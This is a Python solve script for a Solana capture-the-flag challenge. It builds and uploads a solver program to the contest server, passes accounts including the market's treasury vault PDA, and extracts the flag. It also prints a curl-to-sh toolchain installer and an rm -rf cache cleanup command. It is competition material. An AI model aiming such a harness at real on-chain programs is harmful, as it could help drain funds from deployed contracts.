#!/usr/bin/env python3
import os
import re
import shutil
import socket
import subprocess
import sys
from pathlib import Path

try:
    from solders.pubkey import Pubkey
    from solders.system_program import ID as SYS_PROGRAM_ID
except ModuleNotFoundError:
    print("[!] missing Python dependency: solders")
    print("    run: pip install solders")
    sys.exit(1)

HOST = sys.argv[1] if len(sys.argv) > 1 else "challs.scriptsorcerers.xyz"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 10341

# Any valid unique pubkey is fine for the uploaded solver program.
SOLVE_PUBKEY = b"5PjDJaGfSPJj4tFzMRCiuuAasKg5n8dJKXKenhuwyexx"

ROOT = Path(__file__).resolve().parent
SOLVE_DIR = ROOT / "solve"
SO_PATH = SOLVE_DIR / "target" / "deploy" / "solve.so"


def die_toolchain():
    print("[!] solve.so not found and Solana SBF builder is not installed.")
    print()
    print("Install Solana/Anza SBF toolchain, then rerun:")
    print("    sh -c \"$(curl -sSfL https://release.anza.xyz/v2.2.2/install)\"")
    print("    export PATH=\"$HOME/.local/share/solana/install/active_release/bin:$PATH\"")
    print("    cargo build-sbf --version")
    print("    python3 solve.py challs.scriptsorcerers.xyz 10341")
    print()
    print("If your shell is zsh, you can persist PATH with:")
    print("    echo 'export PATH=\"$HOME/.local/share/solana/install/active_release/bin:$PATH\"' >> ~/.zshrc")
    sys.exit(1)


def build_solve_so():
    if SO_PATH.exists():
        return

    if not (shutil.which("cargo-build-sbf") or shutil.which("cargo-build-bpf")):
        die_toolchain()

    print("[*] building solve.so")
    try:
        subprocess.check_call(["cargo", "build-sbf"], cwd=str(SOLVE_DIR))
        return
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        print(f"[!] failed to build solve.so: {e}")
        print("[!] If the error mentions edition2024, clean the registry/cache and keep crypto-common pinned to 0.2.1.")
        print("    rm -rf ~/.cargo/registry/src/index.crates.io-* /tmp/cargo-build-sbf")
        print("    cd solve && cargo update -p crypto-common --precise 0.2.1 && cargo build-sbf")
        sys.exit(1)


def recv_until(sock: socket.socket, token: bytes) -> bytes:
    data = b""
    while token not in data:
        chunk = sock.recv(1)
        if not chunk:
            raise EOFError(f"socket closed before token {token!r}; got {data!r}")
        data += chunk
    return data


def recv_line(sock: socket.socket) -> bytes:
    data = b""
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            break
        data += chunk
    return data


def send_line(sock: socket.socket, data: bytes):
    sock.sendall(data + b"\n")


def pda(seeds, program):
    return Pubkey.find_program_address(seeds, program)[0]


def main():
    build_solve_so()
    solve = SO_PATH.read_bytes()
    print(f"[*] solve.so size: {len(solve)} bytes")

    s = socket.create_connection((HOST, PORT), timeout=20)
    s.settimeout(20)

    recv_until(s, b"program pubkey: ")
    send_line(s, SOLVE_PUBKEY)
    recv_until(s, b"program len: ")
    send_line(s, str(len(solve)).encode())
    s.sendall(solve)

    recv_until(s, b"program: ")
    market = Pubkey.from_string(recv_line(s).strip().decode())
    recv_until(s, b"user: ")
    user = Pubkey.from_string(recv_line(s).strip().decode())

    print(f"[*] market program: {market}")
    print(f"[*] user          : {user}")

    user_config = pda([bytes(user), b"USER"], market)
    config = pda([b"CONFIG"], market)
    item0 = pda([b"RUBBERDUCK"], market)
    treasury = pda([b"VAULT"], market)

    accounts = [
        ("x", market),
        ("ws", user),
        ("w", user_config),
        ("w", config),
        ("w", item0),
        ("w", treasury),
        ("x", SYS_PROGRAM_ID),
    ]

    # read_instruction() protocol: count, then each account as "flags pubkey", then data length and data.
    send_line(s, str(len(accounts)).encode())
    for flags, key in accounts:
        send_line(s, f"{flags} {key}".encode())
    send_line(s, b"0")

    out = b""
    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk

    text = out.decode(errors="ignore")
    print(text)
    m = re.search(r"scriptCTF\{[^}]+\}", text)
    if m:
        print("\n[+] flag:", m.group(0))


if __name__ == "__main__":
    main()
